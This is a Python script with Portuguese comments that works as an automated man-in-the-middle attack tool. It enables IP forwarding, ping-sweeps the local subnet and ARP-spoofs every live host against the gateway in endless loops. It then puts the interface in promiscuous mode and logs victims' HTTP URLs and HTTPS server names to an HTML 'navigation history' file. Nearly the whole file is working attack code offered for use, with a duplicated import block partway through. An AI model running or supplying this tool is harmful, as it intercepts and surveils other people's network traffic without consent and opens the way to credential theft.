import os
import socket
import struct
import threading
from queue import Queue
from time import sleep, strftime
from datetime import datetime
import fcntl
import array
import ipaddress
import queue
import time

# Função para habilitar o encaminhamento de pacotes
def enable_ip_forwarding():
    """
    Habilita o IP Forwarding no Linux.
    """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Função para detectar a interface de rede, IP e máscara
def get_network_info():
    """
    Detecta a interface de rede ativa, IP e máscara de sub-rede.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    max_interfaces = 32
    bytes_needed = max_interfaces * 32
    names = array.array('B', b'\0' * bytes_needed)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        sock.fileno(), 0x8912,  # SIOCGIFCONF
        struct.pack('iL', bytes_needed, names.buffer_info()[0])))[0]
    namestr = names.tobytes()
    interfaces = []

    for i in range(0, outbytes, 40):
        name = namestr[i:i + 16].split(b'\0', 1)[0]
        ip = namestr[i + 20:i + 24]
        try:
            ip_str = socket.inet_ntoa(ip)
            if ip_str.startswith("127."):
                continue
            interfaces.append((name.decode('utf-8'), ip_str))
        except:
            continue

    # Escolhe a primeira interface válida
    if interfaces:
        interface_name = interfaces[0][0]
        ip_address = interfaces[0][1]
        netmask = socket.inet_ntoa(fcntl.ioctl(
            sock.fileno(), 0x891b,  # SIOCGIFNETMASK
            struct.pack('256s', interface_name[:15].encode('utf-8')))[20:24])
        return interface_name, ip_address, netmask
    else:
        raise Exception("Não foi possível encontrar uma interface de rede válida.")

# Função para obter o endereço do gateway padrão
def get_default_gateway():
    """
    Obtém o gateway padrão do sistema.
    """
    with open('/proc/net/route') as f:
        for line in f.readlines():
            parts = line.strip().split()
            if parts[1] == '00000000':
                return socket.inet_ntoa(struct.pack('<L', int(parts[2], 16)))
    return None

# Função para identificar IPs ativos usando ICMP
def ping_worker(ip_queue, active_hosts, lock):
    """
    Thread para verificar IPs ativos na rede.
    """
    while not ip_queue.empty():
        ip = ip_queue.get()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(1)
            packet_id = threading.current_thread().ident & 0xFFFF
            icmp_packet = create_icmp_packet(packet_id)
            sock.sendto(icmp_packet, (ip, 1))
            response, _ = sock.recvfrom(1024)
            if parse_icmp_reply(response, packet_id):
                with lock:
                    if ip not in active_hosts:
                        active_hosts.append(ip)
                        log_to_history("historico_ips.txt", ip)
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            ip_queue.task_done()

# Função para criar pacotes ICMP Echo Request
def create_icmp_packet(packet_id):
    """
    Cria um pacote ICMP Echo Request.
    """
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)  # Tipo 8 (Echo Request)
    data = struct.pack('d', time.time())
    checksum = calculate_checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, checksum, packet_id, 1)
    return header + data

# Função para calcular checksum
def calculate_checksum(data):
    """
    Calcula o checksum de pacotes ICMP.
    """
    checksum = 0
    count_to = (len(data) // 2) * 2
    for count in range(0, count_to, 2):
        checksum += (data[count + 1] << 8) + data[count]
    if count_to < len(data):
        checksum += data[-1]
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum += (checksum >> 16)
    return ~checksum & 0xFFFF

# Função para parsear respostas ICMP
def parse_icmp_reply(packet, packet_id):
    """
    Verifica se a resposta ICMP corresponde ao ID do pacote enviado.
    """
    icmp_header = packet[20:28]
    type, _, _, recv_id, _ = struct.unpack('bbHHh', icmp_header)
    return type == 0 and recv_id == packet_id  # Tipo 0 (Echo Reply)

# Função para registrar o IP no histórico
def log_to_history(file_path, ip):
    """Registra o IP encontrado no arquivo de histórico."""
    with open(file_path, "a") as history_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        history_file.write(f"{timestamp} - IP encontrado: {ip}\n")
        print(f"[+] Registrado no histórico: {ip}")

# Função para criar um pacote ARP
def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
    """
    Cria um pacote ARP para spoofing.
    """
    # Ensure MAC addresses are in bytes format
    if isinstance(target_mac, str):
        target_mac = bytes.fromhex(target_mac.replace(':', ''))
    if isinstance(sender_mac, str):
        sender_mac = bytes.fromhex(sender_mac.replace(':', ''))
    
    ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,               # Hardware type (Ethernet)
        0x0800,          # Protocol type (IPv4)
        6,               # Hardware size
        4,               # Protocol size
        2,               # Opcode (reply)
        sender_mac,      # Sender MAC address
        socket.inet_aton(sender_ip),  # Sender IP address
        target_mac,      # Target MAC address
        socket.inet_aton(target_ip),  # Target IP address
    )
    return ether_header + arp_header


# Função para obter o MAC de um endereço IP
def get_mac(ip, interface):
    """
    Realiza uma resolução ARP para obter o MAC associado a um IP.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind((interface, 0))
    mac = None
    for _ in range(5):  # Tenta algumas vezes para garantir
        packet = create_arp_packet(ip, "ff:ff:ff:ff:ff:ff", "0.0.0.0", "00:00:00:00:00:00")
        sock.send(packet)
        response = sock.recv(65535)
        if response[12:14] == b"\x08\x06":  # Verifica se é ARP
            sender_ip = socket.inet_ntoa(response[28:32])
            if sender_ip == ip:
                mac = ':'.join('%02x' % b for b in response[22:28])
                break
    sock.close()
    return mac

# Função para enviar ARP Spoofing
def arp_spoof(target_ip, gateway_ip, interface):
    """
    Envia pacotes ARP para enganar o host e o roteador.
    """
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    attacker_mac = get_attacker_mac(interface)

    target_packet = create_arp_packet(target_ip, target_mac, gateway_ip, attacker_mac)
    gateway_packet = create_arp_packet(gateway_ip, gateway_mac, target_ip, attacker_mac)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))

    while True:
        sock.send(target_packet)
        sock.send(gateway_packet)
        time.sleep(2)

import os
import socket
import struct
import threading
from queue import Queue
from datetime import datetime
import fcntl
import array
import ipaddress
import queue
import time
import subprocess

# Função para habilitar o modo promíscuo sem interferir no NetworkManager
def set_promiscuous_mode(interface):
    """
    Ativa o modo promíscuo na interface especificada sem desativar o NetworkManager.
    """
    try:
        # Ativar o modo promíscuo usando o comando `ip`
        subprocess.run(["sudo", "ip", "link", "set", interface, "promisc", "on"], check=True)
        print(f"[+] Modo promíscuo ativado na interface {interface}")
    except Exception as e:
        print(f"[Erro] Não foi possível ativar o modo promíscuo: {e}")

# Função para desativar o modo promíscuo ao sair
def unset_promiscuous_mode(interface):
    """
    Desativa o modo promíscuo na interface especificada.
    """
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface, "promisc", "off"], check=True)
        print(f"[+] Modo promíscuo desativado na interface {interface}")
    except Exception as e:
        print(f"[Erro] Não foi possível desativar o modo promíscuo: {e}")

# Função para capturar tráfego
def capture_traffic(interface, output_file):
    """
    Captura pacotes HTTP e HTTPS e salva em um relatório HTML.
    """
    set_promiscuous_mode(interface)  # Ativar modo promíscuo

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    sock.bind((interface, 0))  # Vincula o socket à interface fornecida
    with open(output_file, "w") as f:
        f.write("<html><header><title>Historico de Navegacao</title></header><body><ul>\n")
        try:
            while True:
                packet = sock.recv(65535)
                eth_proto = struct.unpack("!H", packet[12:14])[0]

                if eth_proto == 0x0800:  # IPv4
                    ip_header = packet[14:34]
                    ip_proto = struct.unpack("!B", ip_header[9:10])[0]
                    src_ip = socket.inet_ntoa(ip_header[12:16])
                    dest_ip = socket.inet_ntoa(ip_header[16:20])

                    if ip_proto == 6:  # TCP
                        tcp_header = packet[34:54]
                        src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])
                        data_offset = (struct.unpack("!B", tcp_header[12:13])[0] >> 4) * 4
                        payload_offset = 14 + 20 + data_offset  # Ethernet + IP + TCP
                        payload = packet[payload_offset:]

                        if dest_port == 80:  # HTTP
                            try:
                                http_data = payload.decode(errors='ignore')
                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

                                # Extraindo URL do tráfego HTTP
                                headers = http_data.split("\r\n")
                                host = ""
                                path = ""
                                for header in headers:
                                    if header.lower().startswith("host:"):
                                        host = header.split(": ")[1]
                                    if header.startswith("GET") or header.startswith("POST"):
                                        path = header.split(" ")[1]
                                if host:
                                    url = f"http://{host}{path}" if path else f"http://{host}/"
                                    f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
                                    print(f"[+] HTTP URL Capturada: {url}")
                                f.flush()
                            except Exception as e:
                                print(f"[Erro] Não foi possível processar o pacote HTTP: {e}")

                        elif dest_port == 443:  # HTTPS
                            # Extraindo SNI do handshake TLS (se disponível)
                            try:
                                if payload[0] == 0x16:  # Registro TLS
                                    server_name = extract_sni(payload)
                                    timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                                    if server_name:
                                        url = f"https://{server_name}/"
                                        f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
                                        print(f"[+] HTTPS URL Capturada (SNI): {url}")
                                    else:
                                        f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - URL não identificada (HTTPS)</li>\n")
                                    f.flush()
                            except Exception as e:
                                print(f"[Erro] Não foi possível processar o pacote HTTPS: {e}")
        except KeyboardInterrupt:
            print("\n[INFO] Captura interrompida pelo usuário.")
        finally:
            unset_promiscuous_mode(interface)  # Desativar modo promíscuo ao finalizar
        f.write("</ul></body></html>\n")


# Função para extrair o Server Name Indication (SNI)
def extract_sni(tls_data):
    """
    Extrai o Server Name Indication (SNI) de um pacote TLS Client Hello.
    """
    try:
        # Verifica se é um pacote Client Hello
        if tls_data[0] == 0x16 and tls_data[5] == 0x01:  # Handshake + Client Hello
            extensions_length = struct.unpack("!H", tls_data[43:45])[0]
            extensions_start = 45
            extensions_end = extensions_start + extensions_length
            extensions_data = tls_data[extensions_start:extensions_end]

            # Procura pela extensão SNI (tipo 0x00)
            index = 0
            while index < len(extensions_data):
                extension_type = struct.unpack("!H", extensions_data[index:index + 2])[0]
                extension_length = struct.unpack("!H", extensions_data[index + 2:index + 4])[0]
                if extension_type == 0x00:  # SNI encontrado
                    server_name_length = struct.unpack("!H", extensions_data[index + 7:index + 9])[0]
                    server_name = extensions_data[index + 9:index + 9 + server_name_length].decode('utf-8')
                    return server_name
                index += 4 + extension_length
    except Exception:
        pass
    return None

# Função para obter o MAC do atacante
def get_attacker_mac(interface):
    """
    Obtém o MAC do próprio atacante na interface especificada.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    return sock.getsockname()[4]

# Função principal
def main():
    try:
        # Detectar informações de rede
        interface, ip_address, _ = get_network_info()
        gateway_ip = get_default_gateway()
        if not gateway_ip:
            raise Exception("Não foi possível encontrar o gateway padrão.")

        # Calcular a rede e o range de IPs (usando /24 para pegar todos os dispositivos da rede)
        network = ipaddress.ip_network(ip_address + '/24', strict=False)

        # Habilitar IP Forwarding
        print("[*] Habilitando IP Forwarding...")
        enable_ip_forwarding()

        # Varredura de IPs ativos
        print("[*] Realizando varredura de IPs ativos...")
        ip_queue = queue.Queue()
        active_hosts = []
        lock = threading.Lock()

        # Adicionar IPs à fila
        for host in network.hosts():
            ip_queue.put(str(host))

        # Iniciar threads para varredura
        threads = []
        for _ in range(50):  # Número de threads
            t = threading.Thread(target=ping_worker, args=(ip_queue, active_hosts, lock))
            t.start()
            threads.append(t)

        ip_queue.join()

        for t in threads:
            t.join()

        print(f"[+] IPs ativos detectados: {active_hosts}")

        # Iniciar ARP Spoofing
        print("[*] Iniciando ARP Spoofing...")
        spoof_threads = []
        for ip in active_hosts:
            t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
            spoof_threads.append(t)
            t.start()

        # Iniciar captura de tráfego
        print("[*] Capturando tráfego...")
        capture_traffic(interface, "historico.html")

    except Exception as e:
        print(f"[Erro] {e}")

if __name__ == "__main__":
    main()
